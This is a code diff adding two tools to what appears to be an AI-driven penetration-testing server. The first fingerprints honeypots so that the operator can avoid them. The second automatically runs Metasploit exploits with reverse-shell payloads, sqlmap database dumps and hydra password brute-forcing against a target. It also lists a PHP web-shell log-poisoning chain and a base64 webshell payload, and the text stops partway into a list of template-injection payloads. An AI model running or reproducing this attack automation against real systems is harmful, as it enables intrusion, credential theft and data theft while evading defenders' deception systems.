@@ -6198,10 +6198,1024 @@ async def smart_fuzz_engine(
 
 
 # ============================================================================
+# MODULE 25: honeypot_detector — Fingerprint honeypots/deception systems
+# ============================================================================
+
+# Known honeypot signatures database
+HONEYPOT_SIGNATURES = {
+    "cowrie": {
+        "ssh_banners": ["SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2", "SSH-2.0-OpenSSH_5.9p1"],
+        "behaviors": ["accepts_any_password_first_attempt", "unusual_command_responses"],
+        "telltales": ["kippo", "cowrie", "/home/richard"],
+        "default_ports": [22, 2222, 23, 2323],
+    },
+    "dionaea": {
+        "smb_signs": ["all_ports_open_simultaneously", "generic_smb_banner"],
+        "behaviors": ["accepts_all_exploits", "never_crashes"],
+        "default_ports": [21, 42, 80, 135, 443, 445, 1433, 3306, 5060, 5061],
+        "telltales": ["dionaea", "nepenthes"],
+    },
+    "kippo": {
+        "ssh_banners": ["SSH-2.0-OpenSSH_5.1p1 Debian-5"],
+        "behaviors": ["fake_filesystem", "limited_command_set"],
+        "telltales": ["kippo", "/kippo/", "kippo.cfg"],
+        "default_ports": [22, 2222],
+    },
+    "glastopf": {
+        "http_signs": ["identical_404_pages", "unusual_server_headers"],
+        "behaviors": ["reflects_all_inputs", "generic_php_errors"],
+        "telltales": ["glastopf"],
+        "default_ports": [80, 8080],
+    },
+    "honeyd": {
+        "behaviors": ["perfect_os_fingerprint_mismatch", "all_ports_filtered_then_open"],
+        "telltales": ["honeyd"],
+        "network_signs": ["ttl_inconsistency", "tcp_timestamp_anomaly"],
+    },
+    "tpot": {
+        "behaviors": ["many_honeypots_on_one_ip", "elk_stack_visible"],
+        "telltales": ["t-pot", "tpot", "dtag"],
+        "default_ports": [64295, 64297],  # T-Pot management ports
+    },
+    "conpot": {
+        "behaviors": ["scada_all_protocols", "modbus_generic_response"],
+        "default_ports": [80, 102, 161, 502, 2121, 44818, 47808],
+        "telltales": ["conpot"],
+    },
+    "elastichoney": {
+        "behaviors": ["fake_elasticsearch", "accepts_all_queries"],
+        "default_ports": [9200],
+        "telltales": ["elastichoney"],
+    },
+}
+
+# Suspicious behavior scoring weights
+HONEYPOT_SCORING = {
+    "banner_match": 40,          # Known honeypot banner
+    "too_many_open_ports": 15,   # Unrealistic port profile
+    "response_time_anomaly": 10, # Suspiciously fast/uniform response times
+    "ttl_inconsistency": 15,     # TTL doesn't match claimed OS
+    "banner_inconsistency": 20,  # Multiple services claim different OS
+    "accepts_bad_auth": 25,      # Accepts clearly invalid credentials
+    "identical_responses": 15,   # All error pages identical
+    "known_signature": 45,       # Direct match to known honeypot product
+    "service_version_mismatch": 20,  # Version too old for real production
+    "behavioral_anomaly": 15,    # Unusual protocol behavior
+    "network_anomaly": 10,       # ARP/MAC anomalies
+}
+
+
+@mcp.tool()
+async def honeypot_detector(
+    target: str,
+    depth: str = "deep",
+    modules: str = "all",
+    timeout: int = 300,
+) -> str:
+    """Advanced honeypot & deception system detector.
+
+    Analyzes target for signs of honeypots, honeynets, and deception technologies.
+    Uses multi-layer fingerprinting: banner analysis, behavioral testing, timing
+    analysis, protocol anomaly detection, and comparison against known honeypot signatures.
+
+    Modules: banner_analysis, timing_analysis, behavioral_test, protocol_anomaly,
+             signature_match, network_analysis, service_consistency
+    """
+    target = InputValidator.sanitize_target(target)
+    timeout = InputValidator.validate_timeout(timeout, max_timeout=600)
+    execution = session_manager.start_execution("honeypot_detector", target, {"depth": depth, "modules": modules})
+
+    try:
+        scan_depth = ScanDepth(depth) if depth in [e.value for e in ScanDepth] else ScanDepth.DEEP
+        requested = [m.strip() for m in modules.split(",")]
+        all_mods = ["banner_analysis", "timing_analysis", "behavioral_test",
+                     "protocol_anomaly", "signature_match", "network_analysis", "service_consistency"]
+        active = all_mods if "all" in requested else [m for m in requested if m in all_mods]
+
+        results = {"target": target, "depth": depth, "modules": {}, "honeypot_score": 0, "max_score": 100}
+        indicators = []
+        hp_score = 0
+
+        # ── Banner Analysis ──
+        if "banner_analysis" in active:
+            banner_results = {"services_checked": [], "suspicious_banners": [], "known_matches": []}
+            common_ports = [22, 23, 80, 443, 21, 25, 445, 3306, 8080]
+
+            if HAS_PROTOCOL_INTEL:
+                # Use native TCP analysis for banner grabbing
+                async def check_port_banner(port):
+                    try:
+                        tcp = await ProtocolAnalyzer.analyze_tcp(target, port, timeout=5.0)
+                        return {"port": port, "state": tcp.state, "banner": tcp.banner,
+                                "ttl": tcp.ttl, "os_hints": tcp.os_hints, "response_ms": tcp.response_time_ms}
+                    except Exception:
+                        return {"port": port, "state": "error"}
+
+                tasks = [{"name": f"banner_{p}", "coro": check_port_banner(p), "timeout": 8}
+                         for p in common_ports]
+                port_results = await ParallelExecutor.run_parallel(tasks, max_concurrent=5)
+
+                open_ports = []
+                banners_collected = []
+                ttls_seen = set()
+                os_claims = set()
+
+                for pr in port_results:
+                    if pr["status"] == "success" and pr["result"].get("state") == "open":
+                        open_ports.append(pr["result"]["port"])
+                        if pr["result"].get("banner"):
+                            banners_collected.append(pr["result"])
+                            banner_text = pr["result"]["banner"].lower()
+                            # Check against known honeypot banners
+                            for hp_name, hp_data in HONEYPOT_SIGNATURES.items():
+                                for known_banner in hp_data.get("ssh_banners", []):
+                                    if known_banner.lower() in banner_text:
+                                        banner_results["known_matches"].append({
+                                            "port": pr["result"]["port"],
+                                            "honeypot": hp_name,
+                                            "matched_banner": known_banner,
+                                        })
+                                        hp_score += HONEYPOT_SCORING["banner_match"]
+                                        indicators.append(f"Known {hp_name} banner on port {pr['result']['port']}")
+                                for telltale in hp_data.get("telltales", []):
+                                    if telltale.lower() in banner_text:
+                                        banner_results["known_matches"].append({
+                                            "port": pr["result"]["port"],
+                                            "honeypot": hp_name,
+                                            "matched_telltale": telltale,
+                                        })
+                                        hp_score += HONEYPOT_SCORING["known_signature"]
+                                        indicators.append(f"Telltale '{telltale}' found in banner on port {pr['result']['port']}")
+                        if pr["result"].get("ttl"):
+                            ttls_seen.add(pr["result"]["ttl"])
+                        for hint in pr["result"].get("os_hints", []):
+                            os_claims.add(hint.split()[0] if hint else "")
+
+                banner_results["services_checked"] = open_ports
+                banner_results["banners"] = banners_collected
+                banner_results["open_port_count"] = len(open_ports)
+
+                # Too many open ports = suspicious
+                if len(open_ports) >= 7:
+                    hp_score += HONEYPOT_SCORING["too_many_open_ports"]
+                    indicators.append(f"{len(open_ports)} ports open — unusually high for single host")
+
+                # TTL inconsistency (different TTLs from same host)
+                if len(ttls_seen) > 1:
+                    hp_score += HONEYPOT_SCORING["ttl_inconsistency"]
+                    indicators.append(f"TTL inconsistency: {sorted(ttls_seen)} — different OS or virtualization")
+
+                # OS banner inconsistency
+                if len(os_claims) > 1:
+                    hp_score += HONEYPOT_SCORING["banner_inconsistency"]
+                    indicators.append(f"OS claims mismatch: {os_claims}")
+
+            else:
+                # Fallback: use nmap for banner grabbing
+                cmd = f"nmap -sV --version-intensity 5 -p22,23,80,443,21,25,445,3306,8080 {target} -oX -"
+                proc = await asyncio.create_subprocess_shell(
+                    cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
+                stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=60)
+                banner_results["raw_nmap"] = stdout.decode(errors="replace")[:2000]
+
+            results["modules"]["banner_analysis"] = banner_results
+
+        # ── Timing Analysis ──
+        if "timing_analysis" in active:
+            timing_results = {"response_times": [], "anomalies": []}
+            test_ports = [22, 80, 443]
+
+            async def time_connection(port, iteration):
+                try:
+                    start = asyncio.get_event_loop().time()
+                    reader, writer = await asyncio.wait_for(
+                        asyncio.open_connection(target, port), timeout=5.0)
+                    elapsed = (asyncio.get_event_loop().time() - start) * 1000
+                    writer.close()
+                    try:
+                        await writer.wait_closed()
+                    except Exception:
+                        pass
+                    return {"port": port, "iteration": iteration, "time_ms": round(elapsed, 2), "status": "connected"}
+                except Exception:
+                    return {"port": port, "iteration": iteration, "status": "failed"}
+
+            # Multiple connection attempts per port to measure variance
+            timing_tasks = []
+            for port in test_ports:
+                for i in range(3):
+                    timing_tasks.append({
+                        "name": f"timing_{port}_{i}",
+                        "coro": time_connection(port, i),
+                        "timeout": 8
+                    })
+            timing_raw = await ParallelExecutor.run_parallel(timing_tasks, max_concurrent=5)
+
+            port_times = {}
+            for tr in timing_raw:
+                if tr["status"] == "success" and tr["result"].get("status") == "connected":
+                    p = tr["result"]["port"]
+                    if p not in port_times:
+                        port_times[p] = []
+                    port_times[p].append(tr["result"]["time_ms"])
+
+            for port, times in port_times.items():
+                if len(times) >= 2:
+                    avg = sum(times) / len(times)
+                    variance = sum((t - avg) ** 2 for t in times) / len(times)
+                    timing_results["response_times"].append({
+                        "port": port, "times_ms": times, "avg_ms": round(avg, 2),
+                        "variance": round(variance, 2)
+                    })
+                    # Suspiciously uniform response times (real servers have variance)
+                    if variance < 0.5 and avg < 5.0:
+                        hp_score += HONEYPOT_SCORING["response_time_anomaly"]
+                        indicators.append(f"Port {port}: suspiciously uniform response times (var={variance:.2f}ms)")
+
+            results["modules"]["timing_analysis"] = timing_results
+
+        # ── Behavioral Test ──
+        if "behavioral_test" in active:
+            behavioral = {"tests": [], "anomalies": []}
+
+            # Test 1: HTTP behavior — send malformed requests
+            try:
+                async with httpx.AsyncClient(verify=False, timeout=10.0) as client:
+                    # Test identical error responses
+                    error_responses = []
+                    test_paths = ["/AAAAAAAAA", "/nonexistent123", "/%00test", "/../../etc/passwd"]
+                    for path in test_paths:
+                        try:
+                            r = await client.get(f"http://{target}{path}")
+                            error_responses.append({
+                                "path": path, "status": r.status_code,
+                                "length": len(r.text), "server": r.headers.get("server", "")
+                            })
+                        except Exception:
+                            pass
+
+                    if len(error_responses) >= 2:
+                        behavioral["tests"].append({"test": "http_error_consistency", "results": error_responses})
+                        # Check if all error pages are identical (honeypot sign)
+                        lengths = [e["length"] for e in error_responses]
+                        if len(set(lengths)) == 1 and lengths[0] > 0:
+                            hp_score += HONEYPOT_SCORING["identical_responses"]
+                            indicators.append("All HTTP error pages have identical size — possible honeypot")
+
+                    # Test 2: Send obviously malicious request — real servers block, honeypots may accept
+                    try:
+                        r_sqli = await client.get(f"http://{target}/search?q=' OR 1=1 --")
+                        r_normal = await client.get(f"http://{target}/search?q=hello")
+                        if r_sqli.status_code == 200 and r_normal.status_code == 200:
+                            if abs(len(r_sqli.text) - len(r_normal.text)) < 50:
+                                hp_score += HONEYPOT_SCORING["behavioral_anomaly"]
+                                indicators.append("SQLi and normal queries return identical responses")
+                                behavioral["anomalies"].append("identical_sqli_response")
+                    except Exception:
+                        pass
+            except Exception:
+                pass
+
+            # Test 3: SSH behavior (if port 22 open)
+            try:
+                reader, writer = await asyncio.wait_for(
+                    asyncio.open_connection(target, 22), timeout=5.0)
+                banner = await asyncio.wait_for(reader.readline(), timeout=3.0)
+                banner_text = banner.decode(errors="replace").strip()
+                behavioral["tests"].append({"test": "ssh_banner", "banner": banner_text})
+
+                # Check for suspiciously old SSH versions (honeypot signature)
+                old_versions = ["5.1p1", "5.9p1", "6.0p1"]
+                for ov in old_versions:
+                    if ov in banner_text:
+                        hp_score += HONEYPOT_SCORING["service_version_mismatch"]
+                        indicators.append(f"SSH version {ov} is suspiciously old for production")
+                        break
+
+                writer.close()
+                try:
+                    await writer.wait_closed()
+                except Exception:
+                    pass
+            except Exception:
+                pass
+
+            results["modules"]["behavioral_test"] = behavioral
+
+        # ── Protocol Anomaly Detection ──
+        if "protocol_anomaly" in active:
+            anomalies = {"checks": [], "findings": []}
+
+            # Check TCP options consistency
+            if HAS_PROTOCOL_INTEL:
+                async def check_tcp_options(port):
+                    try:
+                        tcp = await ProtocolAnalyzer.analyze_tcp(target, port, timeout=5.0)
+                        return {"port": port, "ttl": tcp.ttl, "mss": tcp.mss,
+                                "window": tcp.window_size, "options": tcp.tcp_options}
+                    except Exception:
+                        return None
+
+                tasks_anom = [{"name": f"anom_{p}", "coro": check_tcp_options(p), "timeout": 8}
+                              for p in [22, 80, 443]]
+                anom_results = await ParallelExecutor.run_parallel(tasks_anom, max_concurrent=3)
+
+                mss_values = set()
+                window_values = set()
+                for ar in anom_results:
+                    if ar["status"] == "success" and ar["result"]:
+                        r = ar["result"]
+                        anomalies["checks"].append(r)
+                        if r.get("mss"):
+                            mss_values.add(r["mss"])
+                        if r.get("window"):
+                            window_values.add(r["window"])
+
+                # Real OS has consistent MSS/window across ports
+                if len(mss_values) > 1:
+                    anomalies["findings"].append({
+                        "type": "mss_inconsistency",
+                        "detail": f"Different MSS values across ports: {mss_values}",
+                    })
+                    hp_score += HONEYPOT_SCORING["network_anomaly"]
+                    indicators.append(f"MSS varies across ports ({mss_values}) — abnormal for single OS")
+
+            results["modules"]["protocol_anomaly"] = anomalies
+
+        # ── Signature Match ──
+        if "signature_match" in active:
+            sig_results = {"matched_profiles": [], "port_profile_matches": []}
+
+            # Get open ports for comparison
+            open_ports_set = set()
+            if "banner_analysis" in results.get("modules", {}):
+                open_ports_set = set(results["modules"]["banner_analysis"].get("services_checked", []))
+
+            for hp_name, hp_data in HONEYPOT_SIGNATURES.items():
+                default_ports = set(hp_data.get("default_ports", []))
+                if default_ports and default_ports.issubset(open_ports_set):
+                    sig_results["port_profile_matches"].append({
+                        "honeypot": hp_name,
+                        "matching_ports": sorted(default_ports),
+                        "confidence": "medium",
+                    })
+                    hp_score += 10
+                    indicators.append(f"Port profile matches {hp_name} default ports")
+
+            results["modules"]["signature_match"] = sig_results
+
+        # ── Service Consistency ──
+        if "service_consistency" in active:
+            consistency = {"checks": [], "findings": []}
+
+            if HAS_PROTOCOL_INTEL:
+                try:
+                    http_analysis = await ProtocolAnalyzer.analyze_http(f"http://{target}", timeout=10.0)
+                    detected_techs = http_analysis.technologies
+                    server_header = ""
+                    for h in http_analysis.headers:
+                        if h.get("name", "").lower() == "server":
+                            server_header = h.get("value", "")
+                            break
+
+                    consistency["detected_technologies"] = detected_techs
+                    consistency["server_header"] = server_header
+
+                    # Check for technology contradictions
+                    if server_header:
+                        sv_lower = server_header.lower()
+                        # Apache claiming to be nginx or vice versa
+                        if ("apache" in sv_lower and any(t.get("name") == "nginx" for t in detected_techs)):
+                            consistency["findings"].append("Server header/technology mismatch: Apache header but nginx detected")
+                            hp_score += HONEYPOT_SCORING["banner_inconsistency"]
+                            indicators.append("Server header contradicts detected technology stack")
+                except Exception:
+                    pass
+
+            results["modules"]["service_consistency"] = consistency
+
+        # ── Network Analysis (ARP/MAC) ──
+        if "network_analysis" in active:
+            net_analysis = {"checks": []}
+            # ARP check — detect if MAC doesn't match expected vendor for OS
+            cmd = f"arp -n {target} 2>/dev/null || ip neigh show {target} 2>/dev/null"
+            proc = await asyncio.create_subprocess_shell(
+                cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
+            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=10)
+            arp_output = stdout.decode(errors="replace").strip()
+            net_analysis["arp_info"] = arp_output
+
+            # Check for VM/container MAC prefixes (common in honeypots)
+            vm_mac_prefixes = {
+                "00:50:56": "VMware", "00:0c:29": "VMware", "00:1c:42": "Parallels",
+                "08:00:27": "VirtualBox", "52:54:00": "QEMU/KVM", "02:42:": "Docker",
+                "00:16:3e": "Xen",
+            }
+            for prefix, vendor in vm_mac_prefixes.items():
+                if prefix.lower() in arp_output.lower():
+                    net_analysis["checks"].append({
+                        "type": "vm_mac_detected",
+                        "vendor": vendor,
+                        "detail": f"MAC prefix {prefix} indicates {vendor} — may be honeypot VM"
+                    })
+                    # VMs alone aren't conclusive but add to score
+                    hp_score += 5
+                    indicators.append(f"VM/container MAC detected ({vendor})")
+
+            results["modules"]["network_analysis"] = net_analysis
+
+        # ── Final Scoring ──
+        hp_score = min(hp_score, 100)
+        results["honeypot_score"] = hp_score
+        results["indicators"] = indicators
+
+        if hp_score >= 70:
+            results["verdict"] = "LIKELY_HONEYPOT"
+            results["confidence"] = "high"
+            results["recommendation"] = "AVOID — Strong indicators of honeypot/deception system. Disengage."
+        elif hp_score >= 40:
+            results["verdict"] = "SUSPICIOUS"
+            results["confidence"] = "medium"
+            results["recommendation"] = "CAUTION — Multiple anomalies detected. Verify manually before engagement."
+        elif hp_score >= 15:
+            results["verdict"] = "LOW_RISK"
+            results["confidence"] = "low"
+            results["recommendation"] = "Minor anomalies — probably real, but verify unusual findings."
+        else:
+            results["verdict"] = "CLEAN"
+            results["confidence"] = "high"
+            results["recommendation"] = "No honeypot indicators detected. Target appears genuine."
+
+        results["known_honeypot_signatures"] = list(HONEYPOT_SIGNATURES.keys())
+
+        # Store findings in memory
+        pentest_memory.store_finding(target, "honeypot_detector", "honeypot_analysis", {
+            "score": hp_score, "verdict": results["verdict"],
+            "indicators": len(indicators), "modules_run": active
+        })
+        kill_chain.advance_phase(target, KillChainPhase.RECONNAISSANCE, "honeypot_detector",
+                                 [f"score:{hp_score}", results["verdict"]])
+
+        session_manager.complete_execution(execution, results)
+        return json.dumps(results, indent=2, default=str)
+
+    except Exception as e:
+        session_manager.complete_execution(execution, {"error": str(e)}, "failed")
+        return json.dumps({"error": str(e), "traceback": traceback.format_exc()})
+
+
+# ============================================================================
+# MODULE 26: auto_exploit — Automated exploitation from vulnerability findings
+# ============================================================================
+
+@mcp.tool()
+async def auto_exploit(
+    target: str,
+    vuln_id: str = "auto",
+    strategy: str = "safe",
+    modules: str = "all",
+    payload_type: str = "auto",
+    lhost: str = "auto",
+    lport: str = "4444",
+    timeout: int = 600,
+) -> str:
+    """Automated exploitation engine that chains reconnaissance findings into attacks.
+
+    Reads PentestMemory for discovered vulnerabilities and launches appropriate
+    exploitation tools (Metasploit, sqlmap, hydra, custom scripts) with contextually
+    adapted parameters. Requires prior recon/scanning to have populated findings.
+
+    Strategy: safe (verify only), moderate (exploit non-destructive), aggressive (full exploitation)
+    Modules: msf_auto, sqlmap_auto, hydra_auto, web_exploit, custom_chain, privesc_suggest
+    """
+    target = InputValidator.sanitize_target(target)
+    timeout = InputValidator.validate_timeout(timeout, max_timeout=1200)
+    execution = session_manager.start_execution("auto_exploit", target, {
+        "strategy": strategy, "vuln_id": vuln_id, "modules": modules
+    })
+
+    try:
+        requested = [m.strip() for m in modules.split(",")]
+        all_mods = ["msf_auto", "sqlmap_auto", "hydra_auto", "web_exploit", "custom_chain", "privesc_suggest"]
+        active = all_mods if "all" in requested else [m for m in requested if m in all_mods]
+
+        results = {
+            "target": target, "strategy": strategy, "modules": {},
+            "exploits_attempted": 0, "exploits_succeeded": 0,
+            "shells_obtained": 0, "credentials_found": 0,
+        }
+
+        # ── Gather intelligence from memory ──
+        ctx = pentest_memory.get_context(target)
+        vulns_found = pentest_memory.get_findings(target, "sqli_found") + \
+                      pentest_memory.get_findings(target, "ssrf") + \
+                      pentest_memory.get_findings(target, "ssti") + \
+                      pentest_memory.get_findings(target, "rce") + \
+                      pentest_memory.get_findings(target, "lfi") + \
+                      pentest_memory.get_findings(target, "xss_stored") + \
+                      pentest_memory.get_findings(target, "credentials") + \
+                      pentest_memory.get_findings(target, "default_creds")
+        tech_stack = pentest_memory.get_tech(target) or {}
+
+        results["intelligence"] = {
+            "total_findings": ctx.get("total_findings", 0),
+            "vuln_types_found": list(set(v.get("type", "") for v in vulns_found if isinstance(v, dict))),
+            "tech_stack": tech_stack,
+        }
+
+        # Get ExploitAdvisor recommendations if available
+        advisor_recs = []
+        if HAS_PROTOCOL_INTEL:
+            # Try to get service info from memory
+            for finding in pentest_memory.get_findings(target, "open_ports") or []:
+                if isinstance(finding, dict):
+                    for svc in finding.get("services", []):
+                        svc_name = svc.get("name", svc.get("service", ""))
+                        svc_version = svc.get("version", "")
+                        if svc_name:
+                            recs = ExploitAdvisor.recommend(
+                                service=svc_name, version=svc_version,
+                                os=tech_stack.get("os", ""),
+                                technologies=list(tech_stack.keys())
+                            )
+                            advisor_recs.extend(recs)
+
+        if advisor_recs:
+            results["advisor_recommendations"] = [
+                {"service": r.service, "version": r.version, "vulnerability": r.vulnerability,
+                 "exploit_module": r.exploit_module, "confidence": r.confidence,
+                 "payload_suggestion": r.payload_suggestion}
+                for r in advisor_recs[:10]
+            ]
+
+        # Determine LHOST
+        if lhost == "auto":
+            try:
+                proc = await asyncio.create_subprocess_shell(
+                    "ip route get 1.1.1.1 2>/dev/null | awk '{print $7; exit}'",
+                    stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
+                stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=5)
+                detected_lhost = stdout.decode().strip()
+                lhost = detected_lhost if detected_lhost else "127.0.0.1"
+            except Exception:
+                lhost = "127.0.0.1"
+
+        # ── Metasploit Auto-Exploit ──
+        if "msf_auto" in active:
+            msf_results = {"exploits": [], "sessions": []}
+
+            # Build exploit list from advisor recommendations
+            msf_commands = []
+            for rec in advisor_recs:
+                if rec.exploit_module and rec.confidence >= 0.7:
+                    msf_cmd = f"""use {rec.exploit_module}
+set RHOSTS {target}
+set RHOST {target}
+set LHOST {lhost}
+set LPORT {lport}
+"""
+                    if strategy == "safe":
+                        msf_cmd += "check\n"
+                    else:
+                        if payload_type == "auto":
+                            msf_cmd += f"set PAYLOAD generic/shell_reverse_tcp\nset LHOST {lhost}\nset LPORT {lport}\n"
+                        msf_cmd += "exploit -z\n"
+
+                    msf_commands.append({
+                        "module": rec.exploit_module,
+                        "vulnerability": rec.vulnerability,
+                        "confidence": rec.confidence,
+                        "command": msf_cmd.strip(),
+                    })
+
+            # Also check for known CVEs in findings
+            for vuln in vulns_found:
+                if isinstance(vuln, dict):
+                    cve_ids = vuln.get("cves", [])
+                    for cve_id in (cve_ids if isinstance(cve_ids, list) else []):
+                        if cve_id.startswith("CVE-"):
+                            msf_commands.append({
+                                "module": f"search {cve_id}",
+                                "vulnerability": cve_id,
+                                "confidence": 0.6,
+                                "command": f"search {cve_id}\n# Then: use <module>; set RHOSTS {target}; exploit",
+                            })
+
+            if msf_commands:
+                # Generate RC file for batch execution
+                rc_content = "# Auto-generated Metasploit RC file\n"
+                rc_content += f"# Target: {target} | Strategy: {strategy}\n"
+                rc_content += f"# Generated by Kali MCP auto_exploit\n\n"
+                for cmd in msf_commands[:5]:  # Limit to 5 exploits
+                    rc_content += f"# {cmd['vulnerability']} (confidence: {cmd['confidence']})\n"
+                    rc_content += cmd["command"] + "\n\n"
+
+                msf_results["rc_file_content"] = rc_content
+                msf_results["exploits"] = msf_commands[:5]
+                msf_results["execution_command"] = f"msfconsole -r /tmp/auto_exploit_{target.replace('.', '_')}.rc"
+                results["exploits_attempted"] += len(msf_commands[:5])
+
+                if strategy != "safe":
+                    # Actually execute via msfconsole (with timeout)
+                    try:
+                        rc_path = f"/tmp/auto_exploit_{target.replace('.', '_')}.rc"
+                        proc = await asyncio.create_subprocess_shell(
+                            f"cat > {rc_path} << 'RCEOF'\n{rc_content}\nexit\nRCEOF",
+                            stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
+                        await proc.communicate()
+
+                        if strategy == "aggressive":
+                            proc = await asyncio.create_subprocess_shell(
+                                f"timeout {min(timeout, 120)} msfconsole -q -r {rc_path} 2>&1",
+                                stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
+                            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=min(timeout, 130))
+                            output = stdout.decode(errors="replace")[:5000]
+                            msf_results["execution_output"] = output
+                            # Parse for sessions
+                            if "session" in output.lower() and "opened" in output.lower():
+                                results["shells_obtained"] += 1
+                                results["exploits_succeeded"] += 1
+                    except asyncio.TimeoutError:
+                        msf_results["execution_note"] = "Metasploit execution timed out"
+                    except Exception as e:
+                        msf_results["execution_note"] = f"Execution error: {str(e)}"
+
+            results["modules"]["msf_auto"] = msf_results
+
+        # ── SQLMap Auto ──
+        if "sqlmap_auto" in active:
+            sqlmap_results = {"targets": [], "injections_found": 0}
+
+            sqli_findings = pentest_memory.get_findings(target, "sqli_found") or []
+            web_findings = pentest_memory.get_findings(target, "web_vulns") or []
+
+            # Build SQLMap commands for each SQLi finding
+            sqlmap_targets = []
+            for finding in sqli_findings:
+                if isinstance(finding, dict):
+                    param = finding.get("param", finding.get("parameter", "id"))
+                    url = finding.get("url", f"http://{target}/")
+                    sqlmap_cmd = f"sqlmap -u '{url}' -p '{param}' --batch --random-agent"
+
+                    if strategy == "safe":
+                        sqlmap_cmd += " --level=1 --risk=1 --technique=B"
+                    elif strategy == "moderate":
+                        sqlmap_cmd += " --level=3 --risk=2 --dbs"
+                    else:
+                        sqlmap_cmd += " --level=5 --risk=3 --dbs --tables --dump --threads=5"
+
+                    # Add tech-specific options
+                    db_type = finding.get("db_type", tech_stack.get("database", ""))
+                    if db_type:
+                        sqlmap_cmd += f" --dbms={db_type}"
+
+                    sqlmap_targets.append({
+                        "url": url, "param": param, "command": sqlmap_cmd,
+                        "db_type": db_type, "strategy": strategy,
+                    })
+
+            if not sqlmap_targets and web_findings:
+                # Fallback: scan main target URL
+                sqlmap_targets.append({
+                    "url": f"http://{target}/",
+                    "param": "auto",
+                    "command": f"sqlmap -u 'http://{target}/' --forms --batch --crawl=2 --random-agent --level=2",
+                    "strategy": strategy,
+                })
+
+            if sqlmap_targets and strategy != "safe":
+                for st in sqlmap_targets[:3]:
+                    try:
+                        proc = await asyncio.create_subprocess_shell(
+                            f"timeout 60 {st['command']} 2>&1 | tail -50",
+                            stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
+                        stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=70)
+                        output = stdout.decode(errors="replace")
+                        st["output"] = output[:3000]
+                        if "injectable" in output.lower() or "parameter" in output.lower():
+                            sqlmap_results["injections_found"] += 1
+                            results["exploits_succeeded"] += 1
+                    except Exception as e:
+                        st["error"] = str(e)
+                    results["exploits_attempted"] += 1
+
+            sqlmap_results["targets"] = sqlmap_targets
+            results["modules"]["sqlmap_auto"] = sqlmap_results
+
+        # ── Hydra Auto ──
+        if "hydra_auto" in active:
+            hydra_results = {"targets": [], "credentials_cracked": []}
+
+            # Determine services to brute force from open ports
+            brute_services = {
+                22: ("ssh", "root admin user"),
+                21: ("ftp", "anonymous admin ftp"),
+                3306: ("mysql", "root admin mysql"),
+                5432: ("postgres", "postgres admin"),
+                3389: ("rdp", "administrator admin"),
+                445: ("smb", "administrator admin guest"),
+                23: ("telnet", "root admin"),
+                80: ("http-get", "admin root"),
+            }
+
+            open_ports_data = pentest_memory.get_findings(target, "open_ports") or []
+            target_ports = set()
+            for finding in open_ports_data:
+                if isinstance(finding, dict):
+                    for p in finding.get("ports", []):
+                        if isinstance(p, int):
+                            target_ports.add(p)
+
+            hydra_commands = []
+            for port, (service, users) in brute_services.items():
+                if port in target_ports or not target_ports:  # If no port data, try common
+                    user_list = users.split()
+                    if strategy == "safe":
+                        hydra_cmd = (f"hydra -L <(echo -e '{chr(10).join(user_list[:2])}') "
+                                     f"-P /usr/share/wordlists/rockyou.txt -t 4 -f "
+                                     f"-s {port} {target} {service}")
+                        hydra_commands.append({
+                            "service": service, "port": port, "users": user_list[:2],
+                            "command": hydra_cmd, "note": "Safe mode: limited users, 4 threads"
+                        })
+                    elif strategy in ("moderate", "aggressive"):
+                        threads = 8 if strategy == "moderate" else 16
+                        hydra_cmd = (f"hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt "
+                                     f"-P /usr/share/wordlists/rockyou.txt -t {threads} -f -V "
+                                     f"-s {port} {target} {service}")
+                        hydra_commands.append({
+                            "service": service, "port": port,
+                            "command": hydra_cmd, "threads": threads,
+                        })
+
+            if hydra_commands and strategy != "safe":
+                for hc in hydra_commands[:3]:
+                    try:
+                        proc = await asyncio.create_subprocess_shell(
+                            f"timeout 60 {hc['command']} 2>&1 | tail -20",
+                            stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
+                        stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=70)
+                        output = stdout.decode(errors="replace")
+                        hc["output"] = output[:2000]
+                        parser = DeepOutputParser()
+                        creds = parser.extract_credentials_from_output(output)
+                        if creds:
+                            hydra_results["credentials_cracked"].extend(creds)
+                            results["credentials_found"] += len(creds)
+                            results["exploits_succeeded"] += 1
+                    except Exception as e:
+                        hc["error"] = str(e)
+                    results["exploits_attempted"] += 1
+
+            hydra_results["targets"] = hydra_commands
+            results["modules"]["hydra_auto"] = hydra_results
+
+        # ── Web Exploit ──
+        if "web_exploit" in active:
+            web_results = {"exploits": [], "shells": []}
+
+            # Build web exploit chain from findings
+            web_exploits = []
+
+            # LFI → RCE escalation
+            lfi_findings = pentest_memory.get_findings(target, "lfi") or []
+            if lfi_findings:
+                web_exploits.append({
+                    "type": "lfi_to_rce",
+                    "description": "Local File Inclusion → Remote Code Execution via log poisoning",
+                    "steps": [
+                        f"curl -H 'User-Agent: <?php system($_GET[\"cmd\"]); ?>' http://{target}/",
+                        f"curl 'http://{target}/vuln.php?file=/var/log/apache2/access.log&cmd=id'",
+                        f"curl 'http://{target}/vuln.php?file=/proc/self/environ&cmd=whoami'",
+                    ],
+                    "payload_alternatives": [
+                        "PHP filter: php://filter/convert.base64-encode/resource=/etc/passwd",
+                        "Data wrapper: data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
+                    ],
+                })
+
+            # SSTI → RCE
+            ssti_findings = pentest_memory.get_findings(target, "ssti") or []
+            if ssti_findings:
+                engine = "jinja2"  # default
+                for f in ssti_findings:
+                    if isinstance(f, dict):
+                        engine = f.get("engine", engine)
+
+                if engine == "jinja2":
+                    web_exploits.append({
+                        "type": "ssti_rce",
+                        "engine": "jinja2",
+                        "description": "Server-Side Template Injection → RCE via Jinja2",
+                        "payloads": [
